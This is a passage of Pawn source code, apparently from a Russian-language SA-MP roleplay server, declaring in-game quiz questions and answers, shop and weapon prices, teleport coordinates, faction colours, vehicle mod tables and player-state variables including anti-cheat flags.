	{"16 лет","18 лет","20 лет","25 лет"}, //13
	{"При виде сотрудника ПД","При передвижении за городом"," При передвижении в городе ","В любом случае"}, //14
	{"В городе","В пробке","На трассе","При проезде на перекрестке"}, //15
	{"Только на трассе ","Запрещен","В городе","На перекрестке"}, //16
	{"Нет, нельзя","Да","Только на внедорожниках","Только на грузовиках"}, //17
	{"Только для машин со спец.сигналом","Только для велосипедистов","Всегда разрешен","Всегда запрещен"}, //18
	{"Да, всегда","Нет, не обязательно","Только при погрузке угля","Только при перевозке людей"}, //19
	{"В любом случае","Если надо «Отойти»","При обгоне","При ДТП"}, //20
	{"Нет, не обязательно ","Обязательно","Только при виде сотрудников ПД","Только при включенном поворотнике"}, //21
	{"Нет","Только при включенном аварийном сигнале","Только при виде сотрудников ПД","Только при включенном дальнем свете"}, //22
	{"При включенных фарах","При виде пешехода","Обязательно","Не обязательно"}, //23
	{"Нет, не разрешен","Да, разрешен","Только при виде сотрудников ПД","Только при включенном правом поворотнике"}, //24
	{"Нет, не должны","Только сзади","Только спереди","Должны спереди и сзади"} //25
};
new gUniverTrueAnswer[25]={1,3,4,2,4,3,2,3,1,2,2,1,2,4,3,2,1,3,1,4,2,1,3,1,4};
new gUniverQuestions[25][90] = {
	"Решите пример: 250+50*2",
	"Чему равна сумма углов треугольника?",
	"Кем был Менделеев Дмитрий Иванович?",
	"Столица России?",
	"Столица США?",
	"Сплюснутый квадрат - это",
	"Музыкальный жанр, особенно любимый военными",
	"Ученый, увидевший насквозь все человечество",
	"Что у человека под ногами, когда он идет по мосту?",
	"гора Кавказа?",
	"Какие звери летают",
	"В каком городе родился русский писатель А.П. Чехов?",
	"Чему равен 1л воды?",
	"К какому виду животных относятся змеи?",
	"Метафора - это",
	"Референдум - это",
	"Социология - это?",
	"Чему равен корень из 9",
	"Начало первой Мировой войны?",
	"В каком году родился А.С. Пушкин?",
	"Какая птица существует?",
	"Что в переводе с испанского означает 'королевский'?",
	"Что характерно для меди?",
	"Сколько рук у человека?",
	"Чему равен 1 килограмм?"
};
new gUniverExamAnswers[25][4][75] = {
	{"- 350","- 300","- 600","- 550"}, //1
	{"- 0","- 360","- 180","- Не чему не равна"}, //2
	{"- Админом","- Игроком","- Лидером","- Русский учёный"}, //3
	{"- Русь","- Москва","- Россия","- Самара"}, //4
	{"- США","- Америка","- Варшава","- Вашингтон"}, //5
	{"- Отрезок","- Овал","- Ромб","- Круг"}, //6
	{"- Флейта","- Марш","- Гитара","- Автомат"}, //7
	{"- Физрук","- Учитель","- Рентген","- Игрок"}, //8
	{"- Подошва обуви","- Мост","- Вода","- Небо"}, //9
	{"- Гора","- Казбек","- Гималай","- Дегестан"}, //10
	{"- Сабаки","- Летучие мыши","- Кошки","- Куницы"}, //11
	{"- Таганрог","- Россия","- Америка","- Франция"}, //12
	{"- 1гр","- 1кг","- 2т","- 1т"}, //13
	{"- Насекомое","- Амфибии","- Млекопитающие","- Рептилии"}, //14
	{"- Прямой и переносный смыслы в одном явлении. ","- Замена имени лица предметом.","- Раскрытие одного явления через другое.","- Преувеличение."}, //15
	{"- Реферат","- Голосования","- Покупка дома","- Наука о животных"}, //16
	{"- Машина","- Наука об обществе","- Наука о жуках","- Наука о машинtах"}, //16
	{"- 3","- 9","- 18","- Нет корня"}, //17
	{"-28 июля 1941","- 28 июля 1904","- 28 июля 1914","- 28 июля 1918"}, //18
	{"- 1899г","- 799г","- 1997г","- 1799г"}, //19
	{"- Коврижка","- Каравайка","- Кренделек","- Хала-хала"}, //20
	{"- Реал","- Крузейро","- Вилья","- Пиастр"}, //21
	{"- Глина","- Нечего","- Плотность","- Яркость"}, //22
	{"- 2","- 1","- 4","- 5"}, //23
	{"- 10 гр","- 100 гр","- 1 гр","- 1 000 гр"} //24
};
static const stock gGunCosts[GUN_OBJECTS] = {500,900,3000,4000,6000,5050,4010,9000,7100};
static const stock gGunNames[GUN_OBJECTS][40] = {
	"Кастет",
	"Бейсбольная бита",
	"Дробовик",
	"Colt М1911",
	"Desert Eagle",
	"HK MP5",
	"АК 47",
	"Colt M4",
	"Иж 72"
};

static const stock gShopCosts[SHOP_OBJECTS] = {1000,30000,4000,550,3500,250,2500,15000};
static const stock gShopProd[SHOP_OBJECTS] = {2,5,1,4,9,6,5,6,6};
static const stock gShopNames[SHOP_OBJECTS][25] = {
	"Фотоаппарат",
	"Аптечки для дома",
	"Цветы",
	"Часы",
	"Маска",
	"Сигарета",
	"Газировка",
	"Аптечка",
	"Плеер"
};

static const stock gEateryCosts[EAT_OBJECTS] = {1,2,3,4};
static const stock gEateryProd[EAT_OBJECTS] = {1,2,3,4};
static const stock gEateryNames1[EAT_OBJECTS][25] = {
	"Пицца",
	"Бургер",
	"Куриная ножка",
	"Кола"
};
static const stock gEateryNames2[EAT_OBJECTS][25] = {
	"Бургер",
	"Большой бургер",
	"Гамбургер",
	"Гамбургер в упаковке"
};
static const stock gEateryNames3[EAT_OBJECTS][25] = {
	"Кусочки курицы",
	"Кусок куринной ножки",
	"Куринная ножка",
	"Курица в коробке"
};

static const stock gBarCost[BAR_OBJECTS] = {1,2,3,4,5,6,7};
static const stock gBarProd[BAR_OBJECTS] = {1,2,3,4,5,6,7};
static const stock gBarNames[BAR_OBJECTS][25] = {
	"Вода",
	"Сода",
	"Кока-кола",
	"Пиво",
	"Водка",
	"Коньяк",
	"Абсент"
};

static stock PhoneNumbers[MAX_PLAYERS][8];
static stock Settings[MAX_PLAYERS][8];

static const stock Job_Names[7][32] = {
	"Нет",
	"Водитель маршрутки",
	"Таксист",
	"Развозчик товаров",
	"Развозчик топлива",
	"Автомеханик",
	"Дальнобойщик"
};

new GangEd [ 5 ] ;
new GangPatr [ 5 ] ;
new Text3D:Gang3d [ 2 ] ;

new PlayerText:TDEditor_MENU_PLAYER [ MAX_PLAYERS ] [ 19 ] ;
new Text:TDEditor_MENU_GLOBAL [ 90 ] ;
new Text:TDEditor_PROMO [ 10 ] ;
new Text:TDEditor_LICGLOBAL [ 7 ] ;
new PlayerText:TDEditor_LICPLAYER[ MAX_PLAYERS ] ;
new Text:TDEditor_SKILL_GLOBAL[ 33 ] ;
new PlayerText:TDEditor_SKILL_PLAYER [ MAX_PLAYERS ][ 8 ] ;

//new PlayerText:money_td_player [ MAX_PLAYERS ] [ 9 ] ;

new KickFreezeAFK [ MAX_PLAYERS char ];
new Float:PTick[MAX_PLAYERS];

new DMZone[MAX_PLAYERS];
new bootlepic;
new bottlemoney;
new pocket[2][MAX_PLAYERS];
new bottles[MAX_PLAYERS];

new PlayerText: PhonesSA[MAX_PLAYERS][3];

new PlayerText: skin_td_player [ MAX_PLAYERS ] [ 2 ];

new PlayerText: buy_copter[13][MAX_PLAYERS];
new PlayerText: copter_speed[7][MAX_PLAYERS];
new PlayerText: bus[14][MAX_PLAYERS];
new PlayerText: bus_time[4][MAX_PLAYERS];
//new PlayerText: TDEditor_SPEEDO[MAX_PLAYERS][46];

new PlayerText:TDEditor_INTERACTION_PLAYER[MAX_PLAYERS][10];

new player_bus_timer[MAX_PLAYERS] = {-1, ...};


enum
	E_STRCUT_COPTER_MARKET
{
	copID,
	copCost
};

new copter_cars[3][E_STRCUT_COPTER_MARKET] =
{
	{417, 3000000},
	{447, 4000000},
	{487, 6000000}
};

static
	Float: coord_copter_spawn[][3] =
{
	{1663.4065, 1667.7958, 15.4596},
	{1682.7635, 1666.4777, 15.4596},
	{1700.4663, 1666.4150, 15.4596},
	{1719.6326, 1666.7112, 15.4596},
	{1738.7325, 1666.6418, 15.4596},
	{1758.0618, 1666.8359, 15.4596},
	{1776.9763, 1666.5316, 15.4596},
	{1796.0586, 1666.1268, 15.4596},
	{1813.7842, 1665.9688, 15.4596},
	{1834.8676, 1666.3954, 15.4596}
};

new MafiaEd[3];
new MafiaPatr[3];
new Text3D:Mafia3d[3];
new Text3D:nBank3d[2];
new MafiaTotalBizz[3];


static const stock gGunAmount[9] = {60,70,170,190,200,210,280,300,360}; //Pistol,SD,Deagle,Uzi,MP5,Shotgun,M4A1,AK47,Rifle
static const stock gGunID[9] = {22,23,24,28,29,25,31,30,33}; //Pistol,SD,Deagle,Uzi,MP5,Shotgun,M4A1,AK47,Rifle

new gArmyWarehouse[2];
new Text3D:gArmyWarehouseText;

static const stock TeamColors[] =
{
	NONE_COLOR,
	MAYOR_COLOR,
	LSPD_COLOR,
	SFPD_COLOR,
	FBI_COLOR,
    HOSPITAL_COLOR,
    LIC_COLOR,
    GROVE_COLOR,
    BALLAS_COLOR,
    RIFA_COLOR,
    AZTECAS_COLOR,
    VAGOS_COLOR,
    ARMY_COLOR,
    0xFFFFFFAA,
    0xFFFFFFAA,
    LCN_COLOR,
    YAKUZA_COLOR,
    RM_COLOR,
    LSNEWS_COLOR,
    SFNEWS_COLOR,
    LVNEWS_COLOR,
    LVPD_COLOR,
    HOSPITAL_COLOR,
    HOSPITAL_COLOR,
    MAYOR_COLOR,
    MAYOR_COLOR
};

enum
	E_AREA_PICKUP_INFORMATION
{
	Float: g_pos_area_x,
	Float: g_pos_area_y,
	Float: g_pos_area_z,
	g_area_pickup_word,
	Float: g_set_area_x,
	Float: g_set_area_y,
	Float: g_set_area_z,
	Float: g_set_area_r,
	g_set_area_virtualworld,
	g_set_area_interior,
	g_text[64]
};

new const
	g_area[][E_AREA_PICKUP_INFORMATION] =
{
	{1912.2400,2227.6116,16.0831, -1, 1062.5056,93.5502,1049.7858, 90.0, 4, 4, "Автошкола"},
	{1060.3448,93.5825,1049.7830, -1, 1910.2544,2227.6160,15.7139, 270.0818,0, 0, EOS},
	{-193.3521,624.6976,12.0010, -1, 1970.5222,1909.8281,1338.2734, 269.6333, 0, 0, "Центр Занятости"},
	{1966.5377,1909.8037,1338.2632, -1, -192.8293,627.3680,12.0010, 351.8449, 0, 0, EOS},
	{1937.3792,2160.8503,15.6621, -1, 2557.4622,-1852.5217,2522.8401,358.6696, 1, 1, "ОПГ \"Тамбовская\""},
	{2557.2539,-1854.0968,2522.8401, 1, 1939.3219,2161.0898,15.6982,275.8767, 0, 0, EOS},
	{-2243.4285,263.2012,24.5337, -1, -2616.0586,2907.2678,2738.6201,90.4772, 1, 1, "ОПГ \"Подольская\""},
	{-2614.3381,2907.4282,2738.6201, -1, -2243.3118,265.1190,24.5337,347.6307, 0, 0, EOS},
	{-139.4506,596.9774,12.1345, -1, 104.9863,2883.6355,1010.6396, 0.0, 0, 0, "Загс"},
	{105.0619,2881.2490,1010.6396, -1, -139.6020,595.0690,12.1425,173.2954, 0, 0, EOS},
	{766.0599,757.6620,12.0000, -1, 2559.8416,2362.4409,2337.4524, 180.0, 1, 1, "Спецназ"},
	{2559.8416,2362.4409,2337.4524, -1, 764.4414,758.4229,12.0000, 64.0, 0, 0, EOS},
	{300.3867,1784.1987,12.2032, -1, 187.0622,2261.8816,1001.5000, 0.0, 0, 2, "Евросеть"},
	{187.1847,2260.3918,1001.5000, -1, 299.6534,1781.2084,12.1484, 180.0, 0, 0, EOS},
	{-286.7879,576.8725,12.8447, -1, 443.1308,-73.4438,3002.0000, 180.0000, 0, 0, "ГИБДД"},
	{443.0579,-72.0487,3002.0000, -1, -286.6651,578.3250,12.8447,352.9691, 0, 0, EOS},
	{1919.2585,2303.9565,15.5700, -1, 1931.9535,2314.1973,1122.1925, 90.1697, 0, 0, "Военкомат"},
	{1934.9594,2314.2119,1122.1925, -1, 1917.0359,2302.5281,15.5697, 123.6030, 0, 0, EOS},
	{2089.9834,-2411.0474,21.9106, -1, 229.0747,-173.5362,3003.3940, 270.0, 0, 0, "СМИ"},
	{227.5660,-173.5415,3003.3940, -1, 2089.9434,-2409.0881,21.7477, 360.0, 0, 0, EOS},
	{1818.2976,2095.6655,16.1631, -1, -908.2248,845.0257,2512.9500, 270.0, 0, 0, "Администрация Области"},
	{-911.2231,845.1155,2512.9500, -1, 1819.6105,2095.6440,16.1631, 272.3906, 0, 0, EOS},
	{1933.9873,-1929.7019,34.0532, -1, 622.9960,-6.4078,1174.4821, 90.0, 1, 1, "Русская Мафия"},
	{624.8737,-6.4164,1174.4821, -1, 1935.5800,-1929.7277,33.8186,275.7303, 0, 0, EOS},
	{1923.2290,-2233.8691,11.2581, -1, -226.0566,728.0068,1002.0159, 180.0, 0, 0, "ФСБ"},
	{-225.7506,729.9379,1002.0000, -1, 1923.0828,-2236.4910,11.2537,172.7253, 0, 0, EOS},
	{-235.5897,697.6143,1002.0000, -1, 1940.0251,-2208.0935,11.2581,358.1989, 0, 0, "Задний Двор"},//задний двор ФСб
	{1939.9545,-2210.3533,11.2581, -1, -235.4736,698.7212,1002.0000,356.4084, 0, 0, EOS},
	{104.5447,2864.7170,23.8755, -1, 1859.4028,1615.9633,1021.7215, 0.0, 0, 0, "Казарма"},
	{1860.8226,1615.7698,1021.7215, -1, 104.3762,2866.3760,23.8755, 270.0, 0, 0, EOS},
	{2571.3179,-2407.5088,22.9832, -1, 589.2242,0.9189,1022.9027,273.2835, 0, 0, "МВД"},
	{588.1048,0.8911,1022.9027, -1, 2572.9504,-2407.5813,22.9832, 267.7781, 0, 0, EOS},
	{376.7802,1112.9556,12.6063, -1, 139.9725,1365.8795,1002.9659,89.3561, 0, 0, "Универ"},
	{141.1579,1365.7958,1002.9600, -1, 376.9453,1115.2395,12.0000,356.0463, 0, 0, EOS},
	{-2358.1189,2608.5149,42.1653, -1, 463.5764,-347.0094,1016.4385,275.2131, 1, 1, "Итальянская Мафия"},
	{462.5341,-346.9824,1016.4385, -1, -2356.4968,2608.4368,41.6159,266.9564, 0, 0, EOS},
	{2396.7466,-1830.3074,22.9522, -1, 540.4120,673.4611,3591.5991,89.5222, 0, 0, "Центральный Банк г.Южный\n{cecece}(Нажмите ALT)"},
	{541.5511,673.4509,3591.5991, -1, 2398.4380,-1830.2286,22.9522,271.8841, 0, 0, EOS},
	{-226.2593,696.1098,1002.0000, -1, -2460.6963,-2306.8420,1002.0000,86.0907, 0, 0, "Второй Этаж"},
	{-2458.8433,-2306.6331,1002.0000, -1, -226.0315,697.4698,1002.0000, 0.0000, 0, 0, "Первый Этаж"}
};

new g_area_total[sizeof g_area];

enum AreaInformation
{
	arServerHelp,
	arAdminsZoneHP,
	arHotdogHP,
	arGettingPassport[4],
	arGreenZone[26],
	arLeaveJob[3],
	arEuroSeti,
	arPoliciaA,
	arPoliciaB,
	arBuyNarko[2],
	arLoadPatr,
	arArmyAmmo,
	arItMaAmmo,
 	arRuMaAmmo,
	arUnivTest,
	arArhTest,
	//arInfoIce,
	arArendBall,
	arBuyCopter,
}
new AreaInfo[AreaInformation];

static const stock Float:MedicSpawn[12][4] = {
	{1212.7637,-599.7633,1001.7578,180.3892},
	{1207.2756,-599.9906,1001.7502,180.8317},
	{1209.9406,-589.5347,1001.7502,181.0042},
	{1207.3225,-589.4490,1001.7502,178.0667},
	{1212.8307,-599.9651,998.0313,179.0616},
	{1207.2772,-599.5959,998.0383,180.9183},
	{1209.9686,-589.4828,998.0383,183.0099},
	{1196.8025,-580.8149,998.0313,91.2024},
	{1183.7251,-589.5544,998.0313,180.3232},
	{1189.1592,-589.5146,998.0383,182.2816},
	{1183.6620,-599.7286,998.0313,178.9682},
	{1189.1989,-600.0123,998.0383,180.3782}
};
static const stock Float:CORDSpawn[11][4] = {
	{-489.0175,924.9411,12.1504,270.0},
	{-493.2930,909.0494,12.1504,270.0},
	{-487.4458,898.2422,12.1504,270.0},
	{2507.0908,-2121.4929,23.4558,182.4298},
	{2511.5840,-2121.5171,23.4558,176.1631},
	{2512.4351,-2124.0166,23.4558,86.5489},
	{2501.3040,-2121.4705,23.4458,86.2590},
	{1934.6715,2085.8813,16.4134,89.6822},
	{1915.7839,2078.2075,15.7055,270.7904},
	{1916.4508,2086.5667,15.7055,268.9104},
	{1916.5259,2089.6189,15.7055,269.2238}
};

new Predlog[MAX_PLAYERS];
new ZapretDice[MAX_PLAYERS];
new KostiName[MAX_PLAYERS];
new KostiMoney[MAX_PLAYERS];
new bool:InHospital[MAX_PLAYERS];
new OldMessage[MAX_PLAYERS][150];
new TextReset[MAX_PLAYERS];
new TextResetCMD[MAX_PLAYERS];
new TransferReset[MAX_PLAYERS];
new bool:PlayerDied[MAX_PLAYERS];
new bool:CheckOutMoney[MAX_PLAYERS];
new bool:UseGPS[MAX_PLAYERS];
new UnMaskReset[MAX_PLAYERS];
new bool:PlayerFreezed[MAX_PLAYERS];
new b_Capture[5 char];
new b_Sklad[8 char];
new bool:drawcapt[MAX_PLAYERS];
new bool:MUSICACTIVE = false;
new MUSICURL[256];
new Float:MUSICX = 0.0;
new Float:MUSICY = 0.0;
new Float:MUSICZ = 0.0;
new Float:MUSICDIST = 0.0;
new bool:activemusic[MAX_PLAYERS];
new bool:PlayerMusic[MAX_PLAYERS];

/* Античиты */
new bool:StartGMTest[MAX_PLAYERS];
new bool:slotUsed[MAX_PLAYERS char];
new bool:ac_1[MAX_PLAYERS char];
new WeaponTime[MAX_PLAYERS];
new RapidFire[MAX_PLAYERS];
new playersIP[MAX_PLAYERS][64];
new PlayerBrake[MAX_PLAYERS];
new Float:AC_Air_Player[MAX_PLAYERS][3];
new AC_Air_Time[MAX_PLAYERS];
new Float:AC_Air_Car[MAX_PLAYERS][3];
new AC_Air_Time_Car[MAX_PLAYERS];
new AC_GunCheattime[MAX_PLAYERS];
new PlayerEnterTime[MAX_PLAYERS];
/* Античиты Конец */

/* Слежка за игроком */
new Menu:specmenu;
/* Слежка за игроком Конец */

static const stock BE_Bad_Vehs[] = {
	460, 464, 476, 511, 512, 513, 519, 520, 539, 553, 577, 592, 593, // planes
	417, 425, 447, 465, 469, 487, 488, 497, 501, 548, 563 // heli
};
new bool: BE_Play_Check[MAX_PLAYERS];

new Ships[MAX_PLAYERS];
new Oldskin2[MAX_PLAYERS]; // сохраняет скин игрока
new armystol,armshield;
new armskin; // гардероб
new Text3D:tPickup[13];
new narkoenter[2];
new bankpalomino[2];
new mechanic[6];
new taxicar[23];
new buscar[2];
new comb_car[2];
new AutoCar[2];
//===============
new armycar[24];
new mediccar[10];
new tambcar[6];
new pravocar[7];
new tombcar[6];
new ritmcar[9];
new gibddcar[22];
new podolcar[8];
new rmcar[8];
new fbicar[13];



//new jobproduct[2];
new pickupentered[MAX_PLAYERS] = 0;
new fbipic[2];
new PlayerRegistered[MAX_PLAYERS];
new bool:TaxiON[MAX_PLAYERS] = {false, ...};
new bool:MedicON[MAX_PLAYERS]= {false, ...};
new bool:MechanicON[MAX_PLAYERS]= {false, ...};
new bool:PoliceON[MAX_PLAYERS]= {false, ...};
new gamemodeloaded;
new zavod[2];
new sportpickup;
new Medicines[MAX_PLAYERS];
new GetMedicines[3];
new gunsklad[8];
new sitsklad[2];
new armyammo;
new bool:gym_cloakroom[MAX_PLAYERS];
new PlayerName[MAX_PLAYERS][MAX_PLAYER_NAME];
/**************************************ПИКАПЫ**********************************/
new bolnicapick[2];
new opg1pick[2];
//new voenkomatpick[2];
new minerpick[2];
/**************************************ПИКАПЫ**********************************/
////////////////////////////////////////////////////////////////////////////////
#define cSV              FFCC00 //Основной цвет сервера(04c77f) 009999
#define cER             "{FF0000}|{FFFFFF} " //Цвет ошибки
#define cPS             "{FFFF00}|{FFFFFF} " //Цвет подсказки
#define cDA             "{63BD4E}|{FFFFFF} " //Цвет удачи
#define aAC             "{0000CC}|{FFFFFF} " //Цвет админов
#define cAD             "{ff0033}" //Цвет наказания
/*************************************Сборщик оружия***************************/

//new poezd1;
new PlayerUseHeal[MAX_PLAYERS];
new player_grand_admin[10][24];
new player_fullaccess[10][24];
new gCurHour;
new gCurMinutes;
new set_name = -1;
new AdvertTime, AdvertTime_;
new NewsPrice[40],CallPrice[2], SmsPrice[2], AdvertPrice[2];
new JobPrice[40],ShPrice[2], LesPrice[2], OzPrice[2];
new MerPanel[40],MP1[6],MdPanel[40],MD[6];
new SmsNews[2];
new CallNews[2];
new TOTALBIZZ, TOTALADVERT[2], TOTALVEH, TOTALHOUSE, TOTALGARAGES, TOTALFAMILY; // TOTALPRODUCT, TOTALFUEL
new engine,lights,alarm,doors,bonnet,boot,objective;
new years, months, days;
new coordh[90],coordv[100],boordh[256];

new bool:PlayerFuelMes[MAX_VEHICLES];
static const stock legalmods[48][22] = {
	{400, 1024,1021,1020,1019,1018,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{401, 1145,1144,1143,1142,1020,1019,1017,1013,1007,1006,1005,1004,1003,1001,0000,0000,0000,0000},
	{404, 1021,1020,1019,1017,1016,1013,1007,1002,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{405, 1023,1021,1020,1019,1018,1014,1001,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{410, 1024,1023,1021,1020,1019,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
	{415, 1023,1019,1018,1017,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{418, 1021,1020,1016,1006,1002,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{420, 1021,1019,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{421, 1023,1021,1020,1019,1018,1016,1014,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{422, 1021,1020,1019,1017,1013,1007,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{426, 1021,1019,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{436, 1022,1021,1020,1019,1017,1013,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
	{439, 1145,1144,1143,1142,1023,1017,1013,1007,1003,1001,0000,0000,0000,0000,0000,0000,0000,0000},
	{477, 1021,1020,1019,1018,1017,1007,1006,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{478, 1024,1022,1021,1020,1013,1012,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{489, 1024,1020,1019,1018,1016,1013,1006,1005,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
	{491, 1145,1144,1143,1142,1023,1021,1020,1019,1018,1017,1014,1007,1003,0000,0000,0000,0000,0000},
	{492, 1016,1006,1005,1004,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{496, 1143,1142,1023,1020,1019,1017,1011,1007,1006,1003,1002,1001,0000,0000,0000,0000,0000,0000},
	{500, 1024,1021,1020,1019,1013,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{516, 1021,1020,1019,1018,1017,1016,1015,1007,1004,1002,1000,0000,0000,0000,0000,0000,0000,0000},
	{517, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1016,1007,1003,1002,0000,0000,0000,0000,0000},
	{518, 1145,1144,1143,1142,1023,1020,1018,1017,1013,1007,1006,1005,1003,1001,0000,0000,0000,0000},
	{527, 1021,1020,1018,1017,1015,1014,1007,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{529, 1023,1020,1019,1018,1017,1012,1011,1007,1006,1003,1001,0000,0000,0000,0000,0000,0000,0000},
	{534, 1185,1180,1179,1178,1127,1126,1125,1124,1123,1122,1106,1101,1100,0000,0000,0000,0000,0000},
	{535, 1121,1120,1119,1118,1117,1116,1115,1114,1113,1110,1109,0000,0000,0000,0000,0000,0000,0000},
	{536, 1184,1183,1182,1181,1128,1108,1107,1105,1104,1103,0000,0000,0000,0000,0000,0000,0000,0000},
	{540, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1004,1001,0000,0000,0000,0000},
	{542, 1145,1144,1021,1020,1019,1018,1015,1014,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{546, 1145,1144,1143,1142,1024,1023,1019,1018,1017,1007,1006,1004,1002,1001,0000,0000,0000,0000},
	{547, 1143,1142,1021,1020,1019,1018,1016,1003,1000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{549, 1145,1144,1143,1142,1023,1020,1019,1018,1017,1012,1011,1007,1003,1001,0000,0000,0000,0000},
	{550, 1145,1144,1143,1142,1023,1020,1019,1018,1006,1005,1004,1003,1001,0000,0000,0000,0000,0000},
	{551, 1023,1021,1020,1019,1018,1016,1006,1005,1003,1002,0000,0000,0000,0000,0000,0000,0000,0000},
	{558, 1168,1167,1166,1165,1164,1163,1095,1094,1093,1092,1091,1090,1089,1088,0000,0000,0000,0000},
	{559, 1173,1162,1161,1160,1159,1158,1072,1071,1070,1069,1068,1067,1066,1065,0000,0000,0000,0000},
	{560, 1170,1169,1141,1140,1139,1138,1033,1032,1031,1030,1029,1028,1027,1026,0000,0000,0000,0000},
	{561, 1157,1156,1155,1154,1064,1063,1062,1061,1060,1059,1058,1057,1056,1055,1031,1030,1027,1026},
	{562, 1172,1171,1149,1148,1147,1146,1041,1040,1039,1038,1037,1036,1035,1034,0000,0000,0000,0000},
	{565, 1153,1152,1151,1150,1054,1053,1052,1051,1050,1049,1048,1047,1046,1045,0000,0000,0000,0000},
	{567, 1189,1188,1187,1186,1133,1132,1131,1130,1129,1102,0000,0000,0000,0000,0000,0000,0000,0000},
	{575, 1177,1176,1175,1174,1099,1044,1043,1042,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{576, 1193,1192,1191,1190,1137,1136,1135,1134,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{580, 1023,1020,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{589, 1145,1144,1024,1020,1018,1017,1016,1013,1007,1006,1005,1004,1000,0000,0000,0000,0000,0000},
	{600, 1022,1020,1018,1017,1013,1007,1006,1005,1004,0000,0000,0000,0000,0000,0000,0000,0000,0000},
	{603, 1145,1144,1143,1142,1024,1023,1020,1019,1018,1017,1007,1006,1001,0000,0000,0000,0000,0000}
};


new Text:server_green_zone[1];

enum PTEMP
{
	pUnTestQNumber,
	pTestQNumber,
}
new pTemp[MAX_PLAYERS][PTEMP];

enum CUFF
{
	pCuffer,
	pCuffee
}
new pCuff[MAX_PLAYERS][CUFF];

new bool:EtherCalled[MAX_PLAYERS] = {false, ...};
new bool:Ether[MAX_PLAYERS] = {false, ...};
new bool:EtherLive[MAX_PLAYERS];
new bool:EtherCall[2];
new bool:EtherSms[2];
new bool:Phone[MAX_PLAYERS];
new CellTime[MAX_PLAYERS];
new Mobile[MAX_PLAYERS];
new bool:TPC[MAX_PLAYERS];
new bool:times[MAX_PLAYERS];
new InShop[MAX_PLAYERS];
new bool:PlayerSpawned[MAX_PLAYERS];
new ReFuelTimer[MAX_PLAYERS];
new DrivingTestTime[MAX_PLAYERS];
new FlyTestTime[MAX_PLAYERS];
new WaterTestTime[MAX_PLAYERS];
new Text: select_skin[4];

enum AcStructInformation
{
Float:LastOnFootPosition[3],
	CheckMapTP,
	MapTPLastPick,
Float:MapTP[3]
}
new AcStruct[MAX_PLAYERS][AcStructInformation];

new bool:AdminLogged[MAX_PLAYERS];
new bool:PlayerUseMask[MAX_PLAYERS];
new MaskTimer[MAX_PLAYERS];
new ChosenSkin[MAX_PLAYERS];
new PlayerLogTries[MAX_PLAYERS];
new STimer[MAX_PLAYERS] = {-1, ...};
new PlayerStats[MAX_PLAYERS] = -1;
new NameStats[MAX_PLAYERS];
new ClothesRound[MAX_PLAYERS];
new SelectCharPlace[MAX_PLAYERS];
new Float:PlayerArmour[MAX_PLAYERS];
new InShopSkin[MAX_PLAYERS];
//new Weapons[MAX_PLAYERS][47];
new HouseOffer[MAX_PLAYERS];
new HousePrice[MAX_PLAYERS];
new pPressed[MAX_PLAYERS];
new colors[MAX_PLAYERS][2];
new VehTest[MAX_PLAYERS];
new PlayerLastTick[MAX_PLAYERS];
new Text3D:BusText3D[MAX_PLAYERS];
new Text3D:TaxiText3D[MAX_PLAYERS];

new Ujahhs[MAX_PLAYERS];
new mass_pass[MAX_PLAYERS][11];
// - Player Text Draw's
new PlayerText:SecurityCode[MAX_PLAYERS][10];
new PlayerText:StatusWork[MAX_PLAYERS][6];
new PlayerText:VehNazv[MAX_PLAYERS];
new PlayerText:VehCost[MAX_PLAYERS];
//Осн. текстдрав
new PlayerText:PlayerMenu[MAX_PLAYERS][7];//Каркас меню (5 - меню / 7 - выбор)
new PlayerText:NameDialog[MAX_PLAYERS][11];//Названия строк /menu
new PlayerText:TextDialog[MAX_PLAYERS][5];//Названия строк /menu
// - Text Draw's
new Text:KolvDialog[11];//Кол-во ячеек
new Text:AnimDraw;
new Text:Button[6];
new PlayerText:SelSkin[MAX_PLAYERS];

new
	Text:JRPTD[19],
	PlayerText:JRP_TD[MAX_PLAYERS][2]
;

//new PlayerText:JRP_TD[MAX_PLAYERS][2];
new Text:PhoneSA[24];
new Text:PhoneIP[25];
enum noclipenum
{
	cameramode,
	flyobject,
	mode,
	lrold,
	udold,
	lastmove,
	Float:accelmul
}
new noclipdata[MAX_PLAYERS][noclipenum];
// -
new objectplayerid;

enum admInfo
{
    admGoto,
	admGethere,
	admSpectate,
	admTimeMin,
	admAlog,
	admAclog
}
new AdminInfo[MAX_PLAYERS][admInfo];

const
    MAX_ADMIN_REPORTS = 61,
    MAX_ADMIN_REPORT_TEXT_LENGTH = 116;

enum e_ADMIN_REPORT_INFO
{
    rID,
    rPlayerID,
    rText[MAX_ADMIN_REPORT_TEXT_LENGTH],
    rWhenWroted_Text[10],
    rWhenWroted_Time,
    bool:rIsTooked
};
new gReport[MAX_ADMIN_REPORTS][e_ADMIN_REPORT_INFO];

/*static
	Float: PresentObject[][] =
{
	{156.0057,793.9753,12.1482},
	{412.2428,567.8796,12.0205},
